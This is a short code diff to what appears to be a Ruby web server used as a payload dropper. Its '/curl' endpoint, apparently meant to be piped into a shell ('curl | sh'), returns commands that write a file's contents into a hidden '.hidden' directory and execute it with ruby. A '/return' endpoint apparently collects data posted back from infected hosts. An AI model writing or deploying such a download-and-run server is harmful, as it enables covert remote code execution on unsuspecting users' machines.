@@ -4,7 +4,6 @@ require './ip_manager'
 manager = IpManager.new
 puts ''
 
-
 get '/' do
     return ok("Hello #{params[:name]}\n")
 end
@@ -27,11 +26,9 @@ get '/curl' do
   # TODO if curl | sh, want to start process
   string = ""
   file_contents =  File.read('to_send/hihi')
-  puts file_contents
-  string += "mkdir .hidden; echo \"#{file_contents}\" > .hidden/this.rb; ruby .hidden/this.rb;"
+  string += "mkdir -p .hidden; echo \"#{file_contents}\" > .hidden/this.rb; ruby .hidden/this.rb;"
   return ok(string)
 end
-
 
 post '/return' do
   this = request.body.read.to_s
